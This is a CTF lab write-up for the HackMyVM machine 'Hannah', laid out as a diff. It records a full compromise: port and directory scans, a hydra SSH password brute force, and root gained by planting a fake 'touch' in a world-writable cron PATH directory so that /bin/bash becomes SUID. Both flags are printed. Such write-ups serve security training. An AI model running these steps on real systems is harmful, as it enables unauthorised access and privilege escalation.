@@ -1,0 +1,448 @@
+# Hannah
+
+## Executive Summary
+
+| Item | Content |
+| :--- | :--- |
+| **Platform** | [HackMyVM](https://hackmyvm.eu/) |
+| **Machine** | [Hannah](https://hackmyvm.eu/machines/machine.php?vm=Hannah) |
+| **Author** | [sml](https://hackmyvm.eu/profile/?user=sml) |
+| **Difficulty** | Beginner |
+
+## PenetrationTest
+
+### 1. Enumeration
+
+#### 1-1. Host Scan
+
+The target IP address is 192.168.56.104.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ fping -aqg 192.168.56.102/24
+192.168.56.100
+192.168.56.102
+192.168.56.104
+```
+
+#### 1-2. Port Scan
+
+The target open ports is 22 (ssh), 80 (http), and 113 (ident).
+Auth-owners discovered. 22 (root), 80 (moksha), 113 (root).
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ nmap -A -sS -p- -v -T 4 --script=default,vuln 192.168.56.104 -oN nmap.log                       
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-22 01:13 -0400
+NSE: Loaded 259 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 01:13
+Completed NSE at 01:13, 10.05s elapsed
+Initiating NSE at 01:13
+Completed NSE at 01:13, 0.00s elapsed
+Initiating NSE at 01:13
+Completed NSE at 01:13, 0.00s elapsed
+Initiating ARP Ping Scan at 01:13
+Scanning 192.168.56.104 [1 port]
+Completed ARP Ping Scan at 01:13, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 01:13
+Completed Parallel DNS resolution of 1 host. at 01:13, 0.50s elapsed
+Initiating SYN Stealth Scan at 01:13
+Scanning 192.168.56.104 [65535 ports]
+Discovered open port 22/tcp on 192.168.56.104
+Discovered open port 80/tcp on 192.168.56.104
+Discovered open port 113/tcp on 192.168.56.104
+Completed SYN Stealth Scan at 01:14, 29.01s elapsed (65535 total ports)
+Initiating Service scan at 01:14
+Scanning 3 services on 192.168.56.104
+Completed Service scan at 01:15, 76.37s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 192.168.56.104
+NSE: Script scanning 192.168.56.104.
+Initiating NSE at 01:15
+Completed NSE at 01:16, 68.23s elapsed
+Initiating NSE at 01:16
+Completed NSE at 01:16, 1.04s elapsed
+Initiating NSE at 01:16
+Completed NSE at 01:16, 0.01s elapsed
+Nmap scan report for 192.168.56.104
+Host is up (0.00095s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+|_auth-owners: root
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.4p1: 
+|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
+|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
+|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
+|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
+|       A2B36B85-C737-548F-8C04-9339EDCDBFF5    9.8     https://vulners.com/githubexploit/A2B36B85-C737-548F-8C04-9339EDCDBFF5  *EXPLOIT*
+|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
+|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
+|       6192C35D-F78B-5C0A-AB8D-9826A79A5320    9.8     https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320  *EXPLOIT*
+|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
+|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
+|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
+|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
+|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
+|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0  *EXPLOIT*
+|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F  *EXPLOIT*
+|       991D2CC4-0E09-5745-97A2-4917461BD6EC    7.8     https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC  *EXPLOIT*
+|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
+|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
+|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
+|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
+|       284B94FC-FD5D-5C47-90EA-47900DAD1D1E    7.0     https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E  *EXPLOIT*
+|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
+|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
+|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
+|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0  *EXPLOIT*
+|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
+|       D104D2BF-ED22-588B-A9B2-3CCC562FE8C0    6.5     https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0  *EXPLOIT*
+|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
+|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
+|       C07ADB46-24B8-57B7-B375-9C761F4750A2    6.5     https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2  *EXPLOIT*
+|       A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C    6.5     https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C  *EXPLOIT*
+|       65B15AA1-2A8D-53C1-9499-69EBA3619F1C    6.5     https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C  *EXPLOIT*
+|       5325A9D6-132B-590C-BDEF-0CB105252732    6.5     https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732  *EXPLOIT*
+|       530326CF-6AB3-5643-AA16-73DC8CB44742    6.5     https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742  *EXPLOIT*
+|       FD2E0EBA-ED84-5304-8862-84BCDEB2F288    5.9     https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288  *EXPLOIT*
+|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
+|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
+|       CNVD-2021-25272 5.9     https://vulners.com/cnvd/CNVD-2021-25272
+|       721F040C-37BC-59E1-9433-01A2EAC2E755    5.9     https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755  *EXPLOIT*
+|       6D74A425-60A7-557A-B469-1DD96A2D8FF8    5.9     https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8  *EXPLOIT*
+|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
+|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
+|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
+|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
+|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
+|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  *EXPLOIT*
+|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57  *EXPLOIT*
+|       CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
+|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
+| ssh-hostkey: 
+|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
+|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
+|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
+80/tcp  open  http    nginx 1.18.0
+| vulners: 
+|   nginx 1.18.0: 
+|       NGINX:CVE-2026-42945    9.2     https://vulners.com/nginx/NGINX:CVE-2026-42945
+|       F8BA6D01-09BC-5DB0-A42B-4E563D68898E    9.2     https://vulners.com/githubexploit/F8BA6D01-09BC-5DB0-A42B-4E563D68898E  *EXPLOIT*
+|       E4F9C549-8192-5FB6-AB68-2A0182498EC1    9.2     https://vulners.com/githubexploit/E4F9C549-8192-5FB6-AB68-2A0182498EC1  *EXPLOIT*
+|       E4E784B6-A59D-5F31-AA0B-4BD1AE4C2A25    9.2     https://vulners.com/githubexploit/E4E784B6-A59D-5F31-AA0B-4BD1AE4C2A25  *EXPLOIT*
+|       DCB2198C-FBEF-526A-91B1-077D0C9A371C    9.2     https://vulners.com/githubexploit/DCB2198C-FBEF-526A-91B1-077D0C9A371C  *EXPLOIT*
+|       DB986575-5515-5217-904C-B2F303FC6604    9.2     https://vulners.com/githubexploit/DB986575-5515-5217-904C-B2F303FC6604  *EXPLOIT*
+|       D5303D8B-E27F-584A-8672-68F16628DB95    9.2     https://vulners.com/githubexploit/D5303D8B-E27F-584A-8672-68F16628DB95  *EXPLOIT*
+|       D3DCF4B0-89DE-5EFB-B681-0725BD21449A    9.2     https://vulners.com/githubexploit/D3DCF4B0-89DE-5EFB-B681-0725BD21449A  *EXPLOIT*
+|       CED8F6B1-8F4A-5CA0-9406-3E0DD1C64695    9.2     https://vulners.com/githubexploit/CED8F6B1-8F4A-5CA0-9406-3E0DD1C64695  *EXPLOIT*
+|       C954251A-D5DC-581F-99D7-C85DE9846EF2    9.2     https://vulners.com/githubexploit/C954251A-D5DC-581F-99D7-C85DE9846EF2  *EXPLOIT*
+|       C1FE5C56-3FCE-56DA-AA3A-8F800CE8CBB1    9.2     https://vulners.com/githubexploit/C1FE5C56-3FCE-56DA-AA3A-8F800CE8CBB1  *EXPLOIT*
+|       98A530E3-D6DF-5A1C-A625-F5D67AF2C8F7    9.2     https://vulners.com/githubexploit/98A530E3-D6DF-5A1C-A625-F5D67AF2C8F7  *EXPLOIT*
+|       85F2445E-7854-51E3-BE0F-509BF472696E    9.2     https://vulners.com/githubexploit/85F2445E-7854-51E3-BE0F-509BF472696E  *EXPLOIT*
+|       84F37866-4BB9-51F0-AFC8-B4F941E79576    9.2     https://vulners.com/githubexploit/84F37866-4BB9-51F0-AFC8-B4F941E79576  *EXPLOIT*
+|       7CDA4B34-508C-5DD4-8578-3C5C3A44A4F3    9.2     https://vulners.com/githubexploit/7CDA4B34-508C-5DD4-8578-3C5C3A44A4F3  *EXPLOIT*
+|       76C3397C-09F4-5F1E-B0A5-5AC97266BE1B    9.2     https://vulners.com/githubexploit/76C3397C-09F4-5F1E-B0A5-5AC97266BE1B  *EXPLOIT*
+|       6E238313-C2F5-5929-BD80-D026E4B44DE4    9.2     https://vulners.com/githubexploit/6E238313-C2F5-5929-BD80-D026E4B44DE4  *EXPLOIT*
+|       6CB8FD9B-C748-57A2-9FDB-26224BC4F868    9.2     https://vulners.com/githubexploit/6CB8FD9B-C748-57A2-9FDB-26224BC4F868  *EXPLOIT*
+|       5D544171-289B-5AF6-90DF-2C2B919DE93C    9.2     https://vulners.com/githubexploit/5D544171-289B-5AF6-90DF-2C2B919DE93C  *EXPLOIT*
+|       5ACFBA03-104F-5AF5-AAF1-FB5B7870BF2F    9.2     https://vulners.com/githubexploit/5ACFBA03-104F-5AF5-AAF1-FB5B7870BF2F  *EXPLOIT*
+|       3BAFBF73-2648-5540-811A-F95C893D4778    9.2     https://vulners.com/githubexploit/3BAFBF73-2648-5540-811A-F95C893D4778  *EXPLOIT*
+|       249FFDA3-A061-5AA5-90A9-00C4EA088C4C    9.2     https://vulners.com/githubexploit/249FFDA3-A061-5AA5-90A9-00C4EA088C4C  *EXPLOIT*
+|       204AAC54-CABD-571F-9D3B-BE59F333764B    9.2     https://vulners.com/githubexploit/204AAC54-CABD-571F-9D3B-BE59F333764B  *EXPLOIT*
+|       060C8156-3FA0-592B-949E-4E38AD48E266    9.2     https://vulners.com/githubexploit/060C8156-3FA0-592B-949E-4E38AD48E266  *EXPLOIT*
+|       03328B0E-8919-5D0E-879C-542DCDCC0771    9.2     https://vulners.com/githubexploit/03328B0E-8919-5D0E-879C-542DCDCC0771  *EXPLOIT*
+|       NGINX:CVE-2026-27654    8.8     https://vulners.com/nginx/NGINX:CVE-2026-27654
+|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
+|       NGINX:CVE-2026-27651    8.7     https://vulners.com/nginx/NGINX:CVE-2026-27651
+|       NGINX:CVE-2026-32647    8.5     https://vulners.com/nginx/NGINX:CVE-2026-32647
+|       NGINX:CVE-2026-27784    8.5     https://vulners.com/nginx/NGINX:CVE-2026-27784
+|       NGINX:CVE-2026-42946    8.3     https://vulners.com/nginx/NGINX:CVE-2026-42946
+|       NGINX:CVE-2026-1642     8.2     https://vulners.com/nginx/NGINX:CVE-2026-1642
+|       NGINX:CVE-2022-41741    7.8     https://vulners.com/nginx/NGINX:CVE-2022-41741
+|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
+|       PACKETSTORM:167720      7.7     https://vulners.com/packetstorm/PACKETSTORM:167720      *EXPLOIT*
+|       NGINX:CVE-2021-23017    7.7     https://vulners.com/nginx/NGINX:CVE-2021-23017
+|       EDB-ID:50973    7.7     https://vulners.com/exploitdb/EDB-ID:50973      *EXPLOIT*
+|       B175E582-6BBF-5D54-AF15-ED3715F757E3    7.7     https://vulners.com/githubexploit/B175E582-6BBF-5D54-AF15-ED3715F757E3  *EXPLOIT*
+|       3D5EF267-25AF-5E36-885B-89F728833A86    7.7     https://vulners.com/githubexploit/3D5EF267-25AF-5E36-885B-89F728833A86  *EXPLOIT*
+|       25F34A51-EB79-5BBC-8262-6F1876067F04    7.7     https://vulners.com/githubexploit/25F34A51-EB79-5BBC-8262-6F1876067F04  *EXPLOIT*
+|       245ACDDD-B1E2-5344-B37D-5B9A0B0A1F0D    7.7     https://vulners.com/githubexploit/245ACDDD-B1E2-5344-B37D-5B9A0B0A1F0D  *EXPLOIT*
+|       1337DAY-ID-37837        7.7     https://vulners.com/zdt/1337DAY-ID-37837        *EXPLOIT*
+|       1337DAY-ID-36300        7.7     https://vulners.com/zdt/1337DAY-ID-36300        *EXPLOIT*
+|       00455CDF-B814-5424-952E-9088FBB2D42D    7.7     https://vulners.com/githubexploit/00455CDF-B814-5424-952E-9088FBB2D42D  *EXPLOIT*
+|       NGINX:CVE-2022-41742    7.1     https://vulners.com/nginx/NGINX:CVE-2022-41742
+|       NGINX:CVE-2026-42934    6.3     https://vulners.com/nginx/NGINX:CVE-2026-42934
+|       NGINX:CVE-2026-28753    6.3     https://vulners.com/nginx/NGINX:CVE-2026-28753
+|       NGINX:CVE-2025-53859    6.3     https://vulners.com/nginx/NGINX:CVE-2025-53859
+|       NGINX:CVE-2024-7347     5.7     https://vulners.com/nginx/NGINX:CVE-2024-7347
+|       NGINX:CVE-2025-23419    5.3     https://vulners.com/nginx/NGINX:CVE-2025-23419
+|_      PACKETSTORM:162830      0.0     https://vulners.com/packetstorm/PACKETSTORM:162830      *EXPLOIT*
+|_http-title: Site doesn't have a title (text/html).
+| http-vuln-cve2011-3192: 
+|   VULNERABLE:
+|   Apache byterange filter DoS
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2011-3192  BID:49303
+|       The Apache web server is vulnerable to a denial of service attack when numerous
+|       overlapping byte ranges are requested.
+|     Disclosure date: 2011-08-19
+|     References:
+|       https://seclists.org/fulldisclosure/2011/Aug/175
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+|       https://www.securityfocus.com/bid/49303
+|_      https://www.tenable.com/plugins/nessus/55976
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_auth-owners: moksha
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-server-header: nginx/1.18.0
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /robots.txt: Robots file
+| http-robots.txt: 1 disallowed entry 
+|_/enlightenment
+113/tcp open  ident?
+|_auth-owners: root
+MAC Address: 08:00:27:95:EB:63 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Uptime guess: 39.620 days (since Sun Apr 12 10:24:25 2026)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=252 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.95 ms 192.168.56.104
+
+NSE: Script Post-scanning.
+Initiating NSE at 01:16
+Completed NSE at 01:16, 0.00s elapsed
+Initiating NSE at 01:16
+Completed NSE at 01:16, 0.00s elapsed
+Initiating NSE at 01:16
+Completed NSE at 01:16, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 187.24 seconds
+           Raw packets sent: 65559 (2.885MB) | Rcvd: 65551 (2.623MB)
+```
+
+#### 1-3. WebContentDiscovery
+
+Found index.html and robots.txt.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ gobuster dir --url http://192.168.56.104 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.104
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 19]
+robots.txt           (Status: 200) [Size: 25]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+#### 1.4 index.html
+
+Under construction.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ curl http://192.168.56.104/index.html
+Under construction
+```
+
+#### 1.5 robots.txt
+
+Found /enlightement
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ curl http://192.168.56.104/robots.txt
+Disallow: /enlightenment
+```
+
+#### 1.6 enlightenment
+
+Not found.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ curl http://192.168.56.104/enlightenment
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.18.0</center>
+</body>
+</html>
+```
+
+### 2. Exploitation
+
+#### 2-1. BruteForceAttack
+
+Moksha password is hannah.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ hydra -l moksha -P /usr/share/wordlists/rockyou.txt 192.168.56.104 ssh | tee hydra.log
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-22 01:30:38
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.56.104:22/
+[22][ssh] host: 192.168.56.104   misc: (null)   login: moksha   password: hannah
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-22 01:31:04
+```
+
+#### 2-2. Access
+
+Found user.txt.
+
+```bash
+┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hannah]
+└─$ ssh moksha@192.168.56.104                             
+The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
+ED25519 key fingerprint is: SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.104' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+moksha@192.168.56.104's password: 
+Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
+moksha@hannah:~$ id
+uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+moksha@hannah:~$ ls
+user.txt
+moksha@hannah:~$ cat user.txt
+HMVGGHFWP2023
+```
+
+#### 2-3 PrivilegeEscalation
+
+Found root.txt
+
+```bash
+moksha@hannah:~$ sudo -l
+-bash: sudo: orden no encontrada
+moksha@hannah:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/mount
+moksha@hannah:~$ find / -perm -2000 -type f 2>/dev/null
+/usr/sbin/unix_chkpwd
+/usr/bin/dotlockfile
+/usr/bin/write.ul
+/usr/bin/expiry
+/usr/bin/chage
+/usr/bin/ssh-agent
+/usr/bin/crontab
+/usr/bin/wall
+moksha@hannah:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+* * * * * root touch /tmp/enlIghtenment
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+moksha@hannah:~$ ls -ld /media
+drwxrwxrwx 3 root root 4096 ene  4  2023 /media
+moksha@hannah:~$ cat > /media/touch << 'EOF'
+#!/bin/sh
+chmod +s /bin/bash
+EOF
+moksha@hannah:~$ cat /media/touch 
+#!/bin/sh
+chmod +s /bin/bash
+moksha@hannah:~$ chmod +x /media/touch
+moksha@hannah:~$ ls -la /media/touch 
+-rwxr-xr-x 1 moksha moksha 29 may 22 07:40 /media/touch
+moksha@hannah:~$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
+moksha@hannah:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 mar 27  2022 /bin/bash
+moksha@hannah:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(moksha) gid=1000(moksha) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(moksha)
+bash-5.1# whoami
+root
+bash-5.1# ls
+user.txt
+bash-5.1# pwd
+/home/moksha
+bash-5.1# cd /root
+bash-5.1# ls
+root.txt
+bash-5.1# cat root.txt
+HMVHAPPYNY2023
+```
+
+### 3. Conclusion & Loot
+
+I successfully captured flags.
+
+- **User Flag:** HMVGGHFWP2023
+- **Root Flag:** HMVHAPPYNY2023
+
